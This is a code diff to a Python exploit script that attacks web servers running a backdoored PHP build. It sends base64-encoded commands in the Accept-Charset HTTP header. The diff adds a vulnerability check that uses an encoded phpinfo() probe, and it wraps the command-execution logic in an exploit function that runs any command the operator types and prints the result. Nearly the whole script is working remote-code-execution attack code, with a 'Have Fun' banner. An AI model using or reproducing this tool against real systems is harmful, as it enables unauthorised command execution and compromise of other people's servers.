@@ -4,7 +4,7 @@
 @Github: https://github.com/NS-Sp4ce
 @Date: 2019-09-23 23:13:34
 @LastEditors: Sp4ce
-@LastEditTime: 2019-09-24 00:25:08
+@LastEditTime: 2019-09-24 09:07:54
 '''
 import requests
 import base64
@@ -46,6 +46,8 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
     "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"
 ]
+TIME_OUT=10
+
 print(r"""
 
  _____   _    _  _____    _____  _               _          ____                _        _                     
@@ -68,23 +70,47 @@ print(r"""
                     Have Fun
 """)
 
+def checkTarget(url):
+    poc = {
+            "Accept-Charset": "cGhwaW5mbygpOw==",
+            "Accept-Encoding": "gzip,deflate"
+        }
+    try:
+        pocRequest = requests.get(url, headers=poc,timeout=TIME_OUT)
+        if "phpinfo" in str(pocRequest.content):
+            print('[+] Target is vulnerable.')
+            return True
+        else:
+            print('[-] Target is NOT vulnerable.')
+            return False
+    except :
+        print('[-] Looks Like Something Wrong.')
+
+
+def exploit(url,command):
+    headers = {}
+    headers['User-Agent'] = choice(USER_AGENTS)
+    headers['Accept-Encoding'] = 'gzip,deflate'
+    headers['Accept-Charset'] = command
+    try:
+        request = requests.get(url, headers=headers)
+        if request.status_code == 200:
+            print('[+] Command Execute Successful.')
+            print(request.text)
+        else:
+            print('[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.')
+    except:
+        print('[-] Looks Like Something Wrong.\n')
+
+
 if __name__ == "__main__":
     while True:
         url = input("Target Url:\n")
         if 'http' not in url:
             url = "http://" + url
-        cmd = input("Input Your Command:\n")
-        command = str(base64.b64encode(cmd.encode('utf-8')), "utf-8")
-        headers = {}
-        headers['User-Agent'] = choice(USER_AGENTS)
-        headers['Accept-Encoding'] = 'gzip,deflate'
-        headers['Accept-Charset'] = command
-        try:
-            request = requests.get(url, headers=headers)
-            if request.status_code == 200:
-                print('[+] Command Execute Successful.')
-                print(request.text)
-            else:
-                print('[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.')
-        except:
-            print('[-] Looks Like Something Wrong.\n')
+        print('[i] Checking Target...')
+        if checkTarget(url):
+            cmd = input("Input Your Command:\n")
+            command = str(base64.b64encode(cmd.encode('utf-8')), "utf-8")
+            exploit(url,command)
+        
